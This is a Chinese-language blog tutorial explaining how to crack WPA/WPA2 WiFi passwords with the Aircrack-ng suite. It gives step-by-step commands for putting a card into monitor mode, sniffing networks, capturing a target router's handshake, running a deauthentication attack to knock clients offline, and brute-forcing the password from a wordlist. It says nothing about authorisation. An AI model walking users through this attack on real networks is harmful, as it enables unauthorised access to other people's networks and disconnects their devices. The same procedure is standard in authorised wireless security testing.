---
title: WiFi 密码破解
date: 2025-12-13 23:34:20
tags: Tutorial
categories: Technology
keywords: WiFi-hacking
top_img: img/default-top-bg.jpg
copyright_author: https://github.com/tooplick
copyright_author_href: https://github.com/tooplick
copyright_url: https://ygking.top/WiFi-hacking
---

# 介绍
本篇将介绍如何使用  [**Aircrack-ng**](https://www.aircrack-ng.org/) 对 WPA/WPA2 协议进行握手攻击，获取握手包以供离线暴力破解WiFi密码

# 前提条件

  1. 无线网卡
  2. Linux系统，如 Kali
  3. aircrack-ng 软件包
 
## 准备

- Kali Linux 系统自带 aircrack-ng  
- 如果使用其他Linux发行版需要额外安装 aircrack-ng 软件包

### Ubuntu
```bash
sudo apt install aircrack-ng  
```

### Arch Linux
```bash
sudo pacman -S aircrack-ng  
```

### 其他Linux发行版请自行安装

# 开始

## 扫描

### 启用root账号

```bash
sudo su
```

### 查看网络设备

```bash
iwconfig
```

### 网卡开启监听模式

```bash
airmon-ng start wlan0
```

### 嗅探WiFi

```bash
airodump-ng wlan0mon
```
## 抓包

### 启动抓包

```bash
airodump-ng -w capture -c 信道 --bssid 路由器MAC wlan0mon
```

> Tips:  
>
> `capture` 为保存的握手包名称  
> 该命令用于抓取 WPA/WPA2 四次握手包，用于离线密码破解

### 取消认证攻击

```bash
aireplay-ng -0 5 -a 路由器MAC -c 客户端MAC wlan0mon
```
> Tips:  
>
> `5`: 发送 5 个断开连接数据包  
> `客户端MAC` 请查看目录下`.csv`文件  
>  这是一个 Deauthentication（取消认证）攻击命令，用于强制目标设备与Wi-Fi路由器断开连接，以便捕获WPA握手包

握手包将会保存为`.cap`文件，用于离线破解

### 关闭监听模式

```bash
airmon-ng stop wlan0mon
```

## 破解密码

### 使用 aircrack-ng 简单破解

```bash
aircrack-ng -w  字典文件.txt 抓取握手包名称.cap
```

### 高级破解

复杂密码可以使用  [**WIFIPR**](https://www.passcape.com/index.php?section=downloads&category=29) 或 [**hashcat**](https://hashcat.net/hashcat/) 破解，本教程将不多赘述
